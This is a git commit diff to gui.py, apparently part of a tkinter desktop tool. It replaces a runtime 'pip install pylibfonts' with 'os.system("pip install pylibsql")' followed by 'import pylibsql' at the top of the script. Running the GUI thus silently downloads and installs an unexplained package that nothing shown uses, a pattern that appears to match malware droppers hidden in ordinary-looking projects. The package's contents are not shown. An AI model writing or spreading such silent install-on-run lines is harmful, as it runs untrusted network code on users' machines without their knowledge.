2642c6fb83f21bed08539eb7c03daebadc621244
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-05-02 12:20:04 -0700

    Update gui.py

--- gui.py
+++ gui.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pylibfonts")
-import pylibfonts
+os.system("pip install pylibsql")
+import pylibsql
 import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
 from urllib.request import urlopen, Request
